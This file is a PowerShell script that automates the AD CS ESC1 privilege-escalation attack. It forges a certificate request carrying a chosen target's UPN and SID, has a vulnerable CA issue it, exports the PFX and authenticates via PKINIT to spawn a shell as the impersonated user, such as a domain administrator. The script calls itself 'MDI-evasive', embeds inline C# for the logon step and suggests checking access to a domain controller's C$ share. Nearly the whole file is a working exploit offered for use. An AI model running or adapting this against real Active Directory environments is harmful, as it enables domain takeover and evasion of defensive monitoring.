<#
.SYNOPSIS
    Automated ESC1 exploitation using only built-in Windows tools (single-file version).

.DESCRIPTION
    Self-contained script that chains certreq + certutil + PKINIT to exploit AD CS ESC1
    from a domain-joined workstation without any offensive tooling.

    Flow:
      1. Generates SID extension hex (Strong Certificate Mapping bypass)
      2. Creates a certificate request INF with the target's UPN and SID
      3. Submits the request via certreq to the vulnerable CA
      4. Exports the issued certificate as PFX
      5. Authenticates via PKINIT using the Windows API (MDI-evasive)
      6. Spawns a new process running as the target user

    This is a consolidated v2 of Invoke-ESC1.ps1 that inlines all helper scripts
    (Get-SidExtensionHex, Invoke-RunAsWithCert) so no companion files are needed.

.PARAMETER CA
    The CA config string in the format "CA_HOSTNAME\CA_NAME".
    Example: "ca01.corp.local\CORP-CA"

.PARAMETER Template
    The vulnerable ESC1 certificate template name.
    Example: "User"

.PARAMETER TargetUPN
    The UPN of the user to impersonate.
    Example: "administrator@corp.local"

.PARAMETER TargetSID
    The SID of the target user.
    Example: "S-1-5-21-1234567890-987654321-1122334455-500"

.PARAMETER Domain
    The Active Directory domain name.
    Example: "CORP.LOCAL"

.PARAMETER Command
    The command to execute in the new logon session.
    Default: "powershell.exe"

.PARAMETER OutputPath
    Directory for temporary files. Default: current directory.

.PARAMETER KeepFiles
    Do not delete temporary files (INF, REQ, CER, PFX) after completion.

.EXAMPLE
    .\Invoke-ESC1-v2.ps1 -CA "ca01.corp.local\CORP-CA" -Template "User" `
        -TargetUPN "administrator@corp.local" `
        -TargetSID "S-1-5-21-1234567890-987654321-1122334455-500" `
        -Domain "CORP.LOCAL"

.EXAMPLE
    .\Invoke-ESC1-v2.ps1 -CA "ca01.corp.local\CORP-CA" -Template "VulnTemplate" `
        -TargetUPN "administrator@corp.local" `
        -TargetSID "S-1-5-21-1234567890-987654321-1122334455-500" `
        -Domain "CORP.LOCAL" -Command "cmd.exe" -KeepFiles
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$CA,

    [Parameter(Mandatory = $true)]
    [string]$Template,

    [Parameter(Mandatory = $true)]
    [string]$TargetUPN,

    [Parameter(Mandatory = $true)]
    [string]$TargetSID,

    [Parameter(Mandatory = $true)]
    [string]$Domain,

    [Parameter()]
    [string]$Command = "powershell.exe",

    [Parameter()]
    [string]$OutputPath = (Get-Location).Path,

    [Parameter()]
    [switch]$KeepFiles
)

$ErrorActionPreference = "Stop"

# ---------------------------------------------------------------------------
# Inline C# — PKINIT authentication via CreateProcessWithLogonW
# Based on Invoke-RunAsWithCert by Synacktiv (Guillaume Andre)
# https://github.com/synacktiv/Invoke-RunAsWithCert
# ---------------------------------------------------------------------------

$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class RunAsWithCert
{
    const int LOGON_NETCREDENTIALS_ONLY = 2;
    const int CREATE_NEW_CONSOLE = 0x00000010;

    public enum CRED_MARSHAL_TYPE
    {
        CertCredential = 1,
        UsernameTargetCredential
    }

    [StructLayout(LayoutKind.Sequential)]
    struct CERT_CREDENTIAL_INFO
    {
        public uint cbSize;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
        public byte[] rgbHashOfCert;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessWithLogonW(
        String lpUsername,
        String lpDomain,
        String lpPassword,
        uint dwLogonFlags,
        string lpApplicationName,
        string lpCommandLine,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CredFree(IntPtr buffer);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CredMarshalCredential(
        CRED_MARSHAL_TYPE CredType,
        IntPtr Credential,
        out IntPtr MarshaledCredential
    );

    static string NameFromCert(X509Certificate2 cert)
    {
        string name = cert.GetNameInfo(X509NameType.UpnName, false);
        if (String.IsNullOrEmpty(name))
        {
            name = cert.GetNameInfo(X509NameType.DnsName, false).Split('.')[0] + "$";
        }
        else
        {
            name = name.Split('@')[0];
        }
        return name;
    }

    static string MarshalCertificate(X509Certificate2 cert)
    {
        CERT_CREDENTIAL_INFO certInfo = new CERT_CREDENTIAL_INFO();
        certInfo.cbSize = (uint)Marshal.SizeOf(typeof(CERT_CREDENTIAL_INFO));
        certInfo.rgbHashOfCert = cert.GetCertHash();

        IntPtr pCertInfo = Marshal.AllocHGlobal(Marshal.SizeOf(certInfo));
        Marshal.StructureToPtr(certInfo, pCertInfo, false);

        IntPtr marshaledCredential = IntPtr.Zero;
        bool result = CredMarshalCredential(CRED_MARSHAL_TYPE.CertCredential, pCertInfo, out marshaledCredential);
        if (!result)
        {
            throw new Exception(string.Format("CredMarshalCredential failed with error code: 0x{0:X}", Marshal.GetLastWin32Error()));
        }

        string username = Marshal.PtrToStringUni(marshaledCredential);

        Marshal.FreeHGlobal(pCertInfo);
        CredFree(marshaledCredential);

        return username;
    }

    public static void RunAs(string certificate, string domain, string password, string command)
    {
        X509Certificate2 cert = null;
        try
        {
            cert = new X509Certificate2(certificate, password, X509KeyStorageFlags.PersistKeySet);

            Console.WriteLine("[*] Certificate subject : " + cert.Subject);
            Console.WriteLine("[*] Certificate issuer  : " + cert.Issuer);
            Console.WriteLine("[*] Certificate UPN     : " + cert.GetNameInfo(X509NameType.UpnName, false));
            Console.WriteLine("[*] Certificate thumb   : " + cert.Thumbprint);
            Console.WriteLine();

            using (X509Store store = new X509Store(StoreName.My, StoreLocation.CurrentUser))
            {
                store.Open(OpenFlags.ReadWrite);
                store.Add(cert);
            }

            string username = MarshalCertificate(cert);
            string user = NameFromCert(cert);

            Console.WriteLine("[*] Running as {0}\\{1}", domain, user);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            si.lpTitle = string.Format("{0} (running as {1}\\{2})", command, domain, user);

            bool status = CreateProcessWithLogonW(
                username,
                domain,
                null,
                LOGON_NETCREDENTIALS_ONLY,
                null,
                command,
                CREATE_NEW_CONSOLE,
                IntPtr.Zero,
                null,
                ref si,
                out pi
            );

            if (!status)
            {
                throw new Exception(string.Format("CreateProcessWithLogonW failed with error code: 0x{0:X}", Marshal.GetLastWin32Error()));
            }

            Console.WriteLine("[+] Process spawned successfully (PID: {0})", pi.dwProcessId);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
        catch
        {
            throw;
        }
        finally
        {
            if (cert != null)
            {
                Console.WriteLine("[*] Certificate remains in CurrentUser\\My store (thumbprint: {0})", cert.Thumbprint);
                Console.WriteLine("[*] Clean up when done: certutil -delstore -user My {0}", cert.Thumbprint);
                cert.Dispose();
            }
        }
    }
}
"@

# ---------------------------------------------------------------------------
# Helper function — SID to DER-encoded hex for szOID_NTDS_CA_SECURITY_EXT
# ---------------------------------------------------------------------------

function Get-SidExtensionHex {
    param([Parameter(Mandatory = $true)][string]$SidString)

    $sidAscii = [System.Text.Encoding]::ASCII.GetBytes($SidString)

    # OID 1.3.6.1.4.1.311.25.2.1 (szOID_NTDS_CA_SECURITY_EXT inner OID)
    $oid = [byte[]](0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01)

    # OCTET STRING wrapping SID ASCII string
    $octet = [byte[]](0x04, $sidAscii.Length) + $sidAscii

    # Inner CONTEXT[0] wrapping OCTET STRING
    $innerCtx = [byte[]](0xA0, $octet.Length) + $octet

    # Outer CONTEXT[0] wrapping OID + inner CONTEXT[0]
    $outerContent = $oid + $innerCtx
    $outerCtx = [byte[]](0xA0, $outerContent.Length) + $outerContent

    # SEQUENCE wrapping everything
    $seq = [byte[]](0x30, $outerCtx.Length) + $outerCtx

    $hex = ($seq | ForEach-Object { '{0:x2}' -f $_ }) -join ''

    return $hex
}

# ---------------------------------------------------------------------------
# Helper function — PKINIT authentication wrapper
# ---------------------------------------------------------------------------

function Invoke-RunAsWithCert {
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, Mandatory = $true)]
        [string]$Certificate,

        [Parameter(Mandatory = $true)]
        [string]$Domain,

        [Parameter()]
        [string]$Password = "",

        [Parameter()]
        [string]$Command = "powershell.exe"
    )

    try {
        Add-Type -TypeDefinition $Source -Language CSharp
        [RunAsWithCert]::RunAs($Certificate, $Domain, $Password, $Command)
    } catch {
        throw
    }
}

# ---------------------------------------------------------------------------
# Main execution
# ---------------------------------------------------------------------------

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$baseName = "esc1_$timestamp"
$infPath = Join-Path $OutputPath "$baseName.inf"
$reqPath = Join-Path $OutputPath "$baseName.req"
$rspPath = Join-Path $OutputPath "$baseName.rsp"
$cerPath = Join-Path $OutputPath "$baseName.cer"
$pfxPath = Join-Path $OutputPath "$baseName.pfx"

try {
    # Step 1: Generate SID extension hex
    Write-Host "`n[Step 1/6] Generating SID extension hex..." -ForegroundColor Cyan
    $sidHex = Get-SidExtensionHex -SidString $TargetSID

    # Step 2: Create INF file
    Write-Host "[Step 2/6] Creating certificate request INF..." -ForegroundColor Cyan

    # Remove spaces from template name for CertificateTemplate attribute
    $templateAttr = $Template -replace ' ', ''

    $infContent = @"
[Version]
Signature="`$Windows NT$"

[NewRequest]
Subject = "CN=$env:USERNAME"
KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
ProviderName = "Microsoft Enhanced Cryptographic Provider v1.0"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.2

[Extensions]
2.5.29.17 = "{text}"
_continue_ = "upn=$TargetUPN"
1.3.6.1.4.1.311.25.2 = "{hex}$sidHex"
"@

    $infContent | Out-File -FilePath $infPath -Encoding ASCII
    Write-Host "    INF: $infPath" -ForegroundColor Gray

    # Step 3: Generate CSR
    Write-Host "[Step 3/6] Generating CSR with certreq..." -ForegroundColor Cyan
    $result = certreq -new $infPath $reqPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -new failed: $result"
    }
    Write-Host "    REQ: $reqPath" -ForegroundColor Gray

    # Step 4: Submit to CA
    Write-Host "[Step 4/6] Submitting CSR to CA: $CA (Template: $templateAttr) ..." -ForegroundColor Cyan
    $result = certreq -submit -attrib "CertificateTemplate:$templateAttr" -config $CA $reqPath $cerPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -submit failed: $result"
    }
    Write-Host "    CER: $cerPath" -ForegroundColor Gray

    # Step 5: Accept and export PFX
    Write-Host "[Step 5/6] Accepting certificate and exporting PFX..." -ForegroundColor Cyan

    # Snapshot cert store before accept so we can find the new one
    $beforeThumbprints = Get-ChildItem Cert:\CurrentUser\My | Select-Object -ExpandProperty Thumbprint

    $result = certreq -accept $cerPath 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "certreq -accept failed: $result"
    }

    # Find the newly added cert by comparing before/after
    $cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {
        $_.Thumbprint -notin $beforeThumbprints
    } | Select-Object -First 1

    if (-not $cert) {
        throw "Could not find the issued certificate in the store"
    }

    $certThumbprint = $cert.Thumbprint
    $pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, '')
    [System.IO.File]::WriteAllBytes($pfxPath, $pfxBytes)
    Write-Host "    PFX: $pfxPath" -ForegroundColor Gray

    # Step 6: Authenticate via PKINIT
    Write-Host "[Step 6/6] Authenticating via PKINIT as $TargetUPN ..." -ForegroundColor Cyan
    Invoke-RunAsWithCert -Certificate $pfxPath -Domain $Domain -Command $Command

    Write-Host "`n[+] Done. A new $Command window should have opened running as $TargetUPN" -ForegroundColor Green
    Write-Host "[*] Verify with: dir \\<DC_FQDN>\C$" -ForegroundColor Yellow

} catch {
    Write-Host "`n[!] Error: $_" -ForegroundColor Red
    Write-Host "[!] Stack: $($_.ScriptStackTrace)" -ForegroundColor DarkRed
} finally {
    if (-not $KeepFiles) {
        Write-Host "`n[*] Cleaning up temporary files..." -ForegroundColor Gray
        @($infPath, $reqPath, $rspPath, $cerPath, $pfxPath) | ForEach-Object {
            if (Test-Path $_) {
                Remove-Item $_ -Force
                Write-Host "    Removed: $_" -ForegroundColor DarkGray
            }
        }
    } else {
        Write-Host "`n[*] KeepFiles specified - temporary files retained." -ForegroundColor Gray
    }
}